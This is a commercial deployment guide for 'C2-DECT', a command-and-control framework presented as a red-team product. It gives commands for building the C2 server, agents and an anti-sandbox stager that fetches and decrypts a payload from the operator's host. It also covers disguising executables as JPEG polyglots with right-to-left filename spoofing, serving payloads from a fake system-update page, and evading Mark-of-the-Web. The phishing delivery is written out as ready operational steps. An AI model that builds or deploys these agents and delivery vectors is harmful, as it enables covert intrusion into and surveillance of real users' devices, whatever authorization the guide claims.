# C2-DECT Commercial Deployment Guide

## Overview
This guide covers deploying C2-DECT in a commercial/production environment for authorized red team engagements.

---

## 1. Server Deployment

### 1.1 System Requirements
- **OS**: Linux (Ubuntu 22.04+, Debian 12, RHEL 9) or Windows Server 2022
- **Go**: 1.21+ (for building)
- **RAM**: 2 GB minimum, 4 GB recommended
- **CPU**: 2 cores minimum
- **Disk**: 10 GB free space
- **Network**: Static IP, port 8443 (configurable)

### 1.2 Quick Start (First Run)
```bash
# Clone and build
git clone <repo> c2-dect
cd c2-dect/server
go build -o ../build/server.exe ./cmd/main.go

# First run - creates config, generates JWT secret, requires initial admin
cd ../build
./server.exe --setup-user admin --setup-pass "SecurePass123!"
```

**Output**:
```
[*] Generated new JWT secret and saved to c2-dect.conf
[+] Initial admin user 'admin' created
[+] Server listening on 0.0.0.0:8443 (https)
[+] REST API: https://0.0.0.0:8443/api/
[+] Agent checkin: https://0.0.0.0:8443/agent/checkin
```

### 1.3 Configuration File (`c2-dect.conf`)
```json
{
  "jwt_secret": "base64-encoded-256-bit-secret",
  "setup_done": true
}
```
- **Never commit this file** - contains signing key for JWT tokens
- Backup securely - loss = all existing tokens invalidated
- File permissions: `0600` (owner read/write only)

### 1.4 TLS Certificates
- Self-signed cert generated on first run (`server.crt`, `server.key`)
- For production: replace with valid CA-signed certificate
- Agent trusts cert on first checkin (TOFU) or pin via malleable profile

### 1.5 Running as Service (systemd)
```ini
# /etc/systemd/system/c2-dect.service
[Unit]
Description=C2-DECT C2 Server
After=network.target

[Service]
Type=simple
User=c2dect
WorkingDirectory=/opt/c2-dect/build
ExecStart=/opt/c2-dect/build/server.exe --addr 0.0.0.0:8443
Restart=on-failure
RestartSec=10
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now c2-dect
```

---

## 2. Operator GUI (Windows)

### 2.1 Requirements
- Windows 10/11 or Windows Server 2019+
- .NET 8 Runtime (or build with `dotnet publish -r win-x64 --self-contained`)

### 2.2 Build
```powershell
cd gui/C2Dect
dotnet publish -c Release -r win-x64 --self-contained -o ../../build/gui
```

### 2.3 Connect
1. Launch `C2Dect.exe`
2. Enter server URL: `https://<server-ip>:8443`
3. Login with credentials from setup

---

## 3. Agent Generation

### 3.1 Standard Agent (Windows)
```bash
cd build
go build -o agent.exe ../cmd/agent_go
```

### 3.2 Payload with Delivery Kit (Staged)
```bash
# 1. Build stage (encrypts agent DEX with AES-GCM)
cd delivery
python stage.py --apk ../build/agent.apk --url http://<server>:8899/payload --out out/

# 2. Build stager (anti-sandbox, downloads & decrypts payload)
python evasion/stager_build.py --url http://<server>:8899/d/<token> --out ../build/stager.exe

# 3. Create delivery vector
python win_polyglot.py merge --jpeg cover.jpg --exe ../build/stager.exe --out out/foto.jpg.exe
```

### 3.3 Delivery Vectors
| Vector | Use Case | OpSec Notes |
|--------|----------|-------------|
| JPEG+APK polyglot | Android, WhatsApp/Email | WhatsApp re-encodes → send as document |
| JPEG+EXE merge + RLO | Windows, phishing | MOTW on download → use ISO container |
| HTA with embedded EXE | Windows, email attachments | PowerShell execution policy |
| LNK with icon spoofing | Windows, USB/drive-by | MOTW, consider ISO/VHD |
| Stager (Go) + token | All, single-use links | Anti-sandbox, self-delete |

---

## 4. Delivery Server (Separate Process)

### 4.1 Start
```bash
cd delivery
python delivery_cli.py serve --port 8899
```

### 4.2 Endpoints
| Endpoint | Purpose |
|----------|---------|
| `/` `/index.html` | Landing page (photo viewer) |
| `/update.html` | Fake system update |
| `*.jpg` | Polyglot image/APK |
| `*.apk` | Direct APK download |
| `/payload` | AES-GCM encrypted DEX (staged) |
| `/d/<token>` | Single-use payload delivery |
| `/checkin?id=A` | Agent post-install |
| `/beacon?id=A` | Agent beaconing |
| `/metrics` | Campaign funnel JSON |
| `/dash` | HTML dashboard |

### 4.3 Token Management
```bash
# Create single-use token for stager
python delivery_cli.py token --file ../build/stager.exe --ip 192.168.1.100 --ttl 3600

# Output: http://192.168.1.100:8899/d/<token> (one use, IP-locked, 1hr TTL)
```

---

## 5. Operational Security Checklist

### 5.1 Before Engagement
- [ ] Server TLS cert pinned in agent/malleable profile
- [ ] JWT secret backed up offline
- [ ] Delivery server on separate IP from C2 core
- [ ] Malleable profiles configured for target environment
- [ ] Kill switch tested (level 1-4)
- [ ] Default admin password changed
- [ ] 2FA enabled for operators (if available)

### 5.2 During Engagement
- [ ] Monitor `/metrics` for delivery funnel
- [ ] Rotate delivery tokens per target
- [ ] Use HTTPS with valid certs where possible
- [ ] Monitor agent beacon intervals (jitter active)
- [ ] Check GUI crash log: `gui_crash.log`

### 5.3 Post Engagement
- [ ] Trigger kill switch level 3 (self-destruct agents)
- [ ] Export telemetry: `telemetry.jsonl`, `c2-dect.db`
- [ ] Revoke operator tokens (restart server)
- [ ] Securely wipe delivery artifacts
- [ ] Generate report from GUI or API

---

## 6. Hardening Recommendations

### 6.1 Network
```
C2 Server (8443)          Delivery Server (8899)
     │                          │
     ├── Firewall: allow only operator IPs
     ├── TLS 1.3 only
     ├── Rate limit: 10 req/s /ip
     └── No direct internet access (use jump host)
```

### 6.2 Binary Hardening (Build Flags)
```bash
# Server
go build -trimpath -ldflags="-s -w -buildid=" -buildmode=pie -o server.exe

# Agent
go build -trimpath -ldflags="-s -w -H windowsgui -buildid=" -o agent.exe

# Stager
go build -trimpath -ldflags="-s -w -H windowsgui -buildid=" -o stager.exe
```

### 6.3 Monitoring
- Set up log aggregation for `telemetry.jsonl`, `gui_crash.log`, `gui_error.log`
- Alert on: new operator login, kill switch activation, delivery token reuse
- Monitor SQLite for unusual session counts

---

## 7. License & Compliance

### 7.1 License Validation
```bash
# Offline license file (provided by MercenaryCorp)
./server.exe --license-file license.lic
```

### 7.2 Export Controls
- **Wassenaar Arrangement**: Dual-use category 4.D.4 (intrusion software)
- **Authorized use only**: Signed scope of work, rules of engagement
- **End-user certificate**: Required for international deployment

### 7.3 Data Handling
- SQLite DB contains: operator hashes, session metadata, task results
- Encrypt at rest: use LUKS/BitLocker on deployment volume
- Retention: 90 days default, configurable per engagement

---

## 8. Troubleshooting

| Issue | Resolution |
|-------|------------|
| Agent won't connect | Check TLS cert match, firewall, malleable profile |
| Delivery 404 on `/payload` | Run `stage.py` first, check `out/payload.bin` exists |
| Token 410/403 | Token used/expired/IP mismatch - generate new |
| GUI crash | Check `gui_crash.log`, update .NET runtime |
| JWT invalid | Clock sync (NTP), secret unchanged in `c2-dect.conf` |

---

## 9. Support Contacts

| Tier | Contact | SLA |
|------|---------|-----|
| Critical (prod down) | support@mercenarycorp.com | 4 hours |
| Standard | support@mercenarycorp.com | 24 hours |
| Security advisory | security@mercenarycorp.com | 72 hours |

---

**Document Version**: 1.0
**Classification**: CONFIDENTIAL - Commercial Use Only
**Last Updated**: 2026-08-17